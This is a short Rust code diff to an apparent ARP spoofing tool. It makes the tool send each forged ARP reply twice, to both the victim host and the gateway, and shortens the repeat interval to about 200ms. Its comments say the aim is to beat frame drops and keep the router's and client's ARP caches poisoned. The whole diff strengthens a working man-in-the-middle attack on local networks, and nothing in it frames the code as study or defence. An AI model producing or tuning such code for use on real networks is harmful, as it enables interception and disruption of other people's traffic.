@@ -265,6 +265,8 @@ impl ArpSpoofer {
                             host.ip,
                             host.mac,
                         );
+                        // Dual-burst on Wi-Fi/Ethernet to prevent frame drop bypass
+                        let _ = s.send_frame(&pkt_host_reply);
                         let _ = s.send_frame(&pkt_host_reply);
 
                         // Poison gateway: Host IP is at spoof_host_mac.
@@ -278,9 +280,11 @@ impl ArpSpoofer {
                             gateway_mac,
                         );
                         let _ = s.send_frame(&pkt_gw_reply);
+                        let _ = s.send_frame(&pkt_gw_reply);
                     }
                 }
-                for _ in 0..10 {
+                // High-frequency 5Hz loop (200ms) prevents router/client ARP refresh window
+                for _ in 0..2 {
                     if !running.load(Ordering::Relaxed) {
                         break;
                     }
